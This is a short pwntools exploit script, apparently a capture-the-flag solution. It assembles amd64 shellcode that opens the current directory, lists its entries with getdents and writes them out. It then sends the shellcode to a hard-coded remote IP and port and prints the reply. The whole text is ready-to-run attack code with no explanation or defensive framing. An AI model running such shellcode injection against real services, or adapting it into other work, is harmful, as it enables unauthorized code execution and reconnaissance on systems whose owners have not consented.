from pwn import *

context.arch = 'amd64'
shellcode = ''' mov rax, 0x2e
push rax
xor rax, rax
add al, 2
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
xor rax, rax
add al, 78
mov rsi, rsp
xor rdx, rdx
add dl, 0xff
syscall
xor al, al
inc al
xor rdi, rdi

inc edi
mov rsi, rsp
syscall

'''
shellcode = asm(shellcode)

r = remote("104.250.105.109", 19004)
r.sendlineafter('shellcode: ', str(len(shellcode)))
r.sendafter('bytes:', shellcode)
hei = r.recvall()
print hei
#print shellcode
